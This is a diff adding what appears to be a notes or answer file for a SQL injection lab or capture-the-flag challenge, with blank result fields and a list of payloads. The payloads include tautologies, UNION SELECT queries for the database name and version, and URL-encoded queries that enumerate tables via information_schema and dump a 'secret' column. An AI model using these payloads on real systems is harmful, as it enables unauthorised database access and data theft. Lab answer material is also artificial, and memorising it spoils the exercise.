@@ -1,0 +1,33 @@
+db_name: 
+db_version: 
+table_names: 
+secret_string: 
+
+url_1: 
+url_2: 
+url_3: 
+url_4: 
+
+database name: 2'union select all 'database
+
+SELECT database()
+
+SELECT * FROM Users WHERE Id = 'X' LIMIT 1;
+
+1' or '1' = '1
+
+1; SELECT database();
+
+2' or union select all 1,database();
+
+1 UNION SELECT 1, version()
+
+2' union select all '1',database(),'&' order by 1; --
+
+2%27+union+select+all+%271%27%2Cdatabase%28%29%2C%27%26%27+order+by+1%3B%23
+
+2%27+union+select+all+%271%27%2Cversion%28%29%2C%27%26%27+order+by+1%3B%23
+
+1%27+union+select+%270%27%2C%271%27%2CGROUP_CONCAT%28table_name+SEPARATOR+%27+%27%29+from+information_schema.tables+where+table_type%3D%27base+table%27+order+by+1%23%28will+get+SECRETTABLE+foo+inject3_users%29
+
+1%27+union+select+%270%27%2C%271%27%2CGROUP_CONCAT%28secret+SEPARATOR+%27+%27%29+from+SECRETTABLE+order+by+1%23
